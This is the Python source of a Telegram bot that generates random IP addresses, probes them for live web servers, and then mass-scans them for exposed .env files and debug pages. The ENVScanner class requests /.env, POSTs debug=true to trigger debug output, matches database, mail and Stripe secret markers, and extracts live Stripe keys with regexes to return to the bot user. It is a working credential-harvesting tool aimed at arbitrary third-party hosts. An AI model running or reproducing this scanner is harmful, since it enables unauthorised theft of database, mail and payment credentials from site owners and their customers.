import os
import re
import time
import ipaddress
import requests
import urllib3
import subprocess
import shutil
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.dummy import Pool
from faker import Faker
from pyrogram import Client, filters
from pyrogram.types import Message, Document
from pyrogram.enums import ParseMode

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Bot configuration
API_ID = 1234567  # Replace with your API ID
API_HASH = 'your_api_hash_here'  # Replace with your API HASH
BOT_TOKEN = 'your_bot_token_here'  # Replace with your bot token

app = Client("ip_tools_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

approved_users = set()
approved_groups = set()

try:
    with open('ass_users.txt', 'r') as user_file:
        approved_users = set(line.strip() for line in user_file)
except FileNotFoundError:
    pass

try:
    with open('ass_groups.txt', 'r') as group_file:
        approved_groups = set(line.strip() for line in group_file)
except FileNotFoundError:
    pass

def format_bold(text):
    """Format text in Serif Bold using HTML formatting"""
    return f"<b>{text}</b>"

@app.on_message(filters.command(["start", "help"]))
async def send_instructions(client, message: Message):
    instructions = (
        f"{format_bold('Welcome to the IP Tools bot!')}\n\n"
        f"{format_bold('Use the following commands:')}\n"
        "/gen - Generate random IP addresses\n"
        "/range - Generate IP addresses in a range\n"
        "/live - Check if IP addresses are live\n"
        "/env - Check for .env files and debug endpoints"
    )
    await message.reply_text(instructions, parse_mode=ParseMode.HTML)

@app.on_message(filters.command("gen"))
async def send_ipgen_request(client, message: Message):
    command_args = message.text.split()
    if len(command_args) == 1:
        await message.reply_text("/gen 10")
        return
    
    try:
        num_ip = int(command_args[1])
        await generate_ip(message, num_ip)
    except ValueError:
        await message.reply_text("Please enter a valid number of IP addresses.")

async def generate_ip(message: Message, num_ip: int):
    ips = []
    faker = Faker()
    for _ in range(num_ip):
        ips.append(faker.ipv4())
    
    with open('ips.txt', 'w') as ip_file:
        ip_file.write('\n'.join(ips))

    with open('ips.txt', 'rb') as file:
        message_text = f"{format_bold(f'{len(ips)} IP generated successfully')}"
        await message.reply_document(
            document=file,
            caption=message_text,
            parse_mode=ParseMode.HTML
        )

    os.remove('ips.txt')

@app.on_message(filters.command("range"))
async def generate_ip_range(client, message: Message):
    if str(message.from_user.id) not in approved_users:
        await message.reply_text("You are not approved to use this command.")
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        await message.reply_text("/range 0.0.0.0 0.0.0.1")
        return

    start_ip_str = command_parts[1]
    end_ip_str = command_parts[2]

    try:
        start_ip = ipaddress.ip_address(start_ip_str)
        end_ip = ipaddress.ip_address(end_ip_str)
    except ValueError:
        await message.reply_text("Invalid IP address format.")
        return

    generated_ips = []
    for ip in ipaddress.summarize_address_range(start_ip, end_ip):
        generated_ips.extend(str(ip) for ip in ipaddress.IPv4Network(ip))

    with open('range.txt', 'w') as file:
        file.write('\n'.join(generated_ips))

    with open('range.txt', 'rb') as file:
        message_text = f"{format_bold(f'IPs generated in range: {start_ip_str} - {end_ip_str}')}"
        await message.reply_document(
            document=file,
            caption=message_text,
            parse_mode=ParseMode.HTML
        )
    
    os.remove('range.txt')

@app.on_message(filters.command("live"))
async def check_liveip_command(client, message: Message):
    if message.reply_to_message and message.reply_to_message.document:
        await check_liveip(message)
    else:
        await message.reply_text("Reply with a IP file /live")

async def check_liveip(message: Message):
    try:
        sent_message = await message.reply_text(f"{format_bold('Please wait while your process is requesting...')}", 
                                              parse_mode=ParseMode.HTML)
        
        file_info = message.reply_to_message.document
        
        if file_info.mime_type == 'text/plain':
            file_path = await app.download_media(message.reply_to_message.document)
            
            with open(file_path, 'r') as file:
                urls = file.read().splitlines()
            
            total_urls = len(urls)
            liveip_result = []

            def valid(ip):
                try:
                    r = requests.get(f'http://{ip}', timeout=3)
                    if r.status_code == 200 or '<title>' in r.text:
                        liveip_result.append(f"{ip}")
                except Exception:
                    pass

            with Pool(500) as p:
                p.map(valid, urls)

            if liveip_result:
                result_text = '\n'.join(liveip_result)
                txt_file = BytesIO(result_text.encode('utf-8'))
                txt_file.name = 'liveips.txt'
                
                await sent_message.delete()
                message_text = f"{format_bold(f'{len(liveip_result)} live IP')}\n"
                await message.reply_document(
                    document=txt_file,
                    caption=message_text,
                    parse_mode=ParseMode.HTML
                )
            else:
                await message.reply_text(f"{format_bold('No live IP addresses found.')}", 
                                       parse_mode=ParseMode.HTML)
            
            os.remove(file_path)
            
    except Exception as e:
        await message.reply_text(f"Error: {str(e)}")

class ENVScanner:
    def __init__(self):
        self.mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG']
        self.checked = 0
        self.debug_found = 0
        self.env_found = 0
        self.results = []

    def scan_env(self, target):
        """Scan for .env files"""
        try:
            url = f'http://{target}/.env'
            response = requests.get(url, verify=False, timeout=10)
            if response.status_code == 200 and any(key in response.text for key in self.mch):
                self.env_found += 1
                return f"ENV: {url}"
            return None
        except:
            return None

    def scan_debug(self, target):
        """Scan for debug endpoints"""
        try:
            data = {'debug': 'true'}
            r = requests.post(f'https://{target}', data=data, allow_redirects=False, verify=False, timeout=10)
            resp = r.text
            self.checked += 1
            
            if any(key in resp for key in self.mch):
                result = f'DEBUG: https://{target}'
                self.debug_found += 1
                
                # Extract Stripe keys
                stripe_keys = []
                pattern = r'sk_live_[a-zA-Z0-9]+'
                matches = re.findall(pattern, resp)
                pattern1 = r'pk_live_[a-zA-Z0-9]+'
                matches1 = re.findall(pattern1, resp)
                
                if matches:
                    stripe_keys.extend(matches)
                if matches1:
                    stripe_keys.extend(matches1)
                
                if stripe_keys:
                    result += f"\nStripe Keys: {', '.join(stripe_keys)}"
                
                return result
            return None
        except:
            return None

    def scan_target(self, target):
        """Scan target for both .env and debug endpoints"""
        env_result = self.scan_env(target)
        debug_result = self.scan_debug(target)
        
        results = []
        if env_result:
            results.append(env_result)
        if debug_result:
            results.append(debug_result)
        
        return results

@app.on_message(filters.command("env"))
async def scan_env_command(client, message: Message):
    if message.reply_to_message and message.reply_to_message.document:
        await scan_env_and_debug(message)
    else:
        await message.reply_text("Reply with a IP file /env")

async def scan_env_and_debug(message: Message):
    try:
        sent_message = await message.reply_text(f"{format_bold('Scanning for .env files and debug endpoints...')}", 
                                              parse_mode=ParseMode.HTML)
        
        file_info = message.reply_to_message.document
        
        if file_info.mime_type == 'text/plain':
            file_path = await app.download_media(message.reply_to_message.document)
            
            with open(file_path, 'r') as file:
                targets = file.read().splitlines()
            
            scanner = ENVScanner()
            all_results = []
            
            # Create directories for saving results
            os.makedirs('DEBUG', exist_ok=True)
            
            with ThreadPoolExecutor(max_workers=500) as executor:
                results = list(executor.map(scanner.scan_target, targets))
                
                for target_results in results:
                    if target_results:
                        all_results.extend(target_results)

            await sent_message.delete()
            
            if all_results:
                result_text = "\n".join(all_results)
                summary = (
                    f"{format_bold('Scan Results:')}\n"
                    f"Targets Checked: {scanner.checked}\n"
                    f".env Files Found: {scanner.env_found}\n"
                    f"Debug Endpoints Found: {scanner.debug_found}\n"
                    f"Total Findings: {len(all_results)}\n\n"
                    f"{format_bold('Details:')}\n{result_text}"
                )
                
                # Save results to file
                with open('scan_results.txt', 'w') as result_file:
                    result_file.write(summary)
                
                with open('scan_results.txt', 'rb') as result_file:
                    await message.reply_document(
                        document=result_file,
                        caption=f"{format_bold('Scan Completed')}",
                        parse_mode=ParseMode.HTML
                    )
                
                os.remove('scan_results.txt')
            else:
                await message.reply_text(
                    f"{format_bold('No .env files or debug endpoints found.')}\n"
                    f"Targets Checked: {scanner.checked}",
                    parse_mode=ParseMode.HTML
                )
            
            os.remove(file_path)
            
    except Exception as e:
        await message.reply_text(f"An error occurred during scanning: {str(e)}")

@app.on_message(filters.command("debug"))
async def debug_info(client, message: Message):
    """Debug information command"""
    debug_text = (
        f"{format_bold('Debug Information')}\n"
        f"User ID: {message.from_user.id}\n"
        f"Chat ID: {message.chat.id}\n"
        f"Approved User: {str(message.from_user.id) in approved_users}\n"
        f"Approved Group: {str(message.chat.id) in approved_groups}\n"
        f"Bot Running: True\n"
        f"Python Version: {subprocess.run(['python', '--version'], capture_output=True, text=True).stdout.strip()}\n"
        f"Current Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )
    await message.reply_text(debug_text, parse_mode=ParseMode.HTML)

def check_env_variables():
    """Check for required environment variables"""
    required_vars = ['API_ID', 'API_HASH', 'BOT_TOKEN']
    missing_vars = [var for var in required_vars if not globals().get(var)]
    
    if missing_vars:
        print(f"Missing environment variables: {', '.join(missing_vars)}")
        return False
    return True

if __name__ == '__main__':
    print(f"{format_bold('Bot Started')}")
    
    # Check environment variables
    if not check_env_variables():
        print("Please set all required environment variables")
        exit(1)
    
    # Create necessary directories
    os.makedirs('DEBUG', exist_ok=True)
    
    # Run the bot
    app.run()
